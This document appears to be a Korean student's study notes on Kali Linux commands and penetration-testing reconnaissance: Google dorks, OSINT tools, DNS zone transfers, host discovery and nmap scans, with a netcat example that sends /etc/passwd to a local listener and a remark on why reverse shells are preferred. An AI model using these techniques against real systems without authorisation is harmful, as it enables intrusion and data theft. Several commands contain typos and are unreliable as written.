# kali linux 명령어

- man john -> 옵션, 명령어를 보여줌

- which ~ -> 위치를 알려줌

- find ~ -> 파일을 찾을때 사용

- touch ~ -> 파일 생성

- find / I grep whitehacker -> whitehacker 라는 문자열을 찾는 명령어 
(greb -> 문자열 찾는 명령어)

- gedit ~ -> 메모장 같은 텍스트 편집기

- vi ~ -> 터미널에서의 메모장 i를 누르고 텍스트입력가능 입력후 exc누르고 다시 
입력가능

- nano ~ -> 터미널에서의 메모장 ^는 ctrl 

- service ~ -> 어떤 서비스를 껐다켰다 하는 명령어

- service --statuse-all -> 전체의 서비스를 보여줌


# 패시브 스캐닝
모의해킹의 첫번째 단계 정보수집
- 패시브 스캐닝 = 정찰 
(패시브는 소극적 공격대상에 직접 접속x 구글같은 검색사이트 이용하거나 제3의 사이트를 이용)

- site:~ -> 그 사이트에 대해서만 검색

- site:~ -site:www.~ ->www. 사이트만 제외하고 검색

- site:~ filetype:pdf -> 특정사이트내 pdf파일 검색

- inurl:admin ->관리자가 특정사이트내에 존재하는지 검색

- intitle:"index of" -> 웹페이지의 제목에 어떤 문자열이 있는지 아는법 
디렉토리 리스팅에 취약한 경우 index of 로 검색해서 디렉토리나 파일에 접근가능  

# exploit-db.com -> 사이트 확인바람

- searchdns.netcraft.com -> 특정 사이트에 대해 운영체제, 도메인 등 정보확인 가능

- whois.kisa.or.kr/kor/main.jsp -> 특정사이트에 대해 정보확인 가능

- theharvester -d bloter.net -b google -> 특정 이메일 주소 확인 가능

- nc -h -> 넷캣 명령어 클라이언트모드 서버모드 구현가능 (서로 동작가능)

# 공격대상

nc -lvp 4444 

nc -lvp 4444 > passwd 

# 클라이언트

nc 127.0.0.1 4444

nc -q 0 127.0.0.1 4444 < /etc/passwd (-q 0 -> 종료)

바인드쉘을 안하고 리버스쉘을 하는이유

-> 방화벽때문

# 액티브 스캐닝

공격 대상을 직접 스캐닝

액티브 스캐닝 단계부터 허가가 반드시 필요함

대표적인 액티브 스캐닝 기법

- DNS 정보수집

- 포트스캐닝

- 웹 스캐닝

- 종합 취약점 스캐닝

DNS 정보수집

- host ~ = 아이피주소 알아내는법

- host -t ns ~ = 

- host -l zonetransfer.me nsztm1. digi. ninja

- dnsenum zonetransfer.me = 메인서버, 메일서버 등을 알아낼수 있음

호스트 검색 

- ping = 네트워크 환경 구축후 host가 살아있는지 체크

- fping -g 아이피 = 아이피주소로 ping 보내기

- fping -q -a -g 아이피 = 살아있는 호스트 보기

- nmap -sn 아이피 = 살아있는 호스트 보기

# 포트 스캐닝

- 공격대상 호스트에 어떤포트가 열려있는지 확인하는법

- port 번호

(HTTP = 80, HTTPS = 443, FTP = 21, SSH = 22)

# Nmap 

- nmap -sU = UDP

- nmap -sT
                 = TCP
- nmap -sS 

- ls -al /usr/share/nmap/scripts = 각종 스크립트 확인가능

- ls -al /usr/share/nmap/scripts/ftp* = ftp 스크립트만 확인가능

- nmap 아이피 -p 21 --script=ftp-vsftpd-backdoor = vsftpd에 backdoor가 있는지 확인하는법
